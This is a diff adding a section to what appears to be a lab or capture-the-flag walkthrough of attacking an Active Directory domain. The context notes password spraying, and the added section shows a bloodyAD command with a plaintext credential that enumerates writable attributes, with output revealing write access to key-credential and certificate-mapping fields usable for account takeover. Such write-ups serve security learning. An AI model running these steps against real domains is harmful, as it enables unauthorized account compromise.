@@ -324,3 +324,16 @@ Ill use `--rid-brute` to also get machine accounts, then use my linux cli skills
 
 There is also no lockout policy, so password spraying is something i can try!
 
+## BloodyAD get writable
+```python
+bloodyAD --host dc01.casper.hsm -d casper.hsm -u xjr -p 'fFvq52PzJpO98X8!' get writable --detail
+
+...[SNIP]...
+
+distinguishedName: CN=jags,CN=Users,DC=casper,DC=hsm
+msDS-KeyCredentialLink: WRITE
+
+distinguishedName: CN=jay,CN=Users,DC=casper,DC=hsm
+altSecurityIdentities: WRITE
+```
+
